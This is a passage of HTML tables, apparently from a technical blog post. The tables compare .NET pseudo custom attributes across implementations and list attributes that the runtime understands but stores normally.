<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.methodimplattribute.aspx">MethodImplAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.nonserializedattribute.aspx">NonSerializedAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.optionalattribute.aspx">OptionalAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.outattribute.aspx">OutAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.preservesigattribute.aspx">PreserveSigAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.serializableattribute.aspx">SerializableAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No***</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.specialnameattribute.aspx">SpecialNameAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes****</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.structlayoutattribute.aspx">StructLayoutAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.typeforwardedtoattribute.aspx">TypeForwardedToAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes****</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR></TBODY></TABLE></DIV>
<P>* Reserved only.<BR>** Its subclasses.<BR>*** Not part of the spec, but the spec does mention it.<BR>**** Not in most recent development snapshot, but code is in cvs.<BR><BR>(System.Reflection.Emit values based on .NET 3.5 SP1)</P>
<P>For completeness and clarity, here is a list of <B>non-pseudo custom attributes</B> that are sometimes mistakenly referred to as pseudo custom attributes:</P>
<DIV style="DIRECTION: ltr">
<TABLE style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; BORDER-COLLAPSE: collapse; DIRECTION: ltr; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid" border=1 cellSpacing=0 cellPadding=0 valign="top">
<TBODY>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.security.allowpartiallytrustedcallersattribute.aspx">AllowPartiallyTrustedCallersAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.classinterfaceattribute.aspx">ClassInterfaceAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime and compiler, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.comcompatibleversionattribute.aspx">ComCompatibleVersionAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime (?) and compiler, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute.aspx">DebuggableAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.guidattribute.aspx">GuidAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime and compiler, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.interfacetypeattribute.aspx">InterfaceTypeAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime and compiler, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.security.securitycriticalattribute.aspx">SecurityCriticalAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.security.securitytransparentattribute.aspx">SecurityTransparentAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime, but stored normally.</P></TD></TR>
<TR>
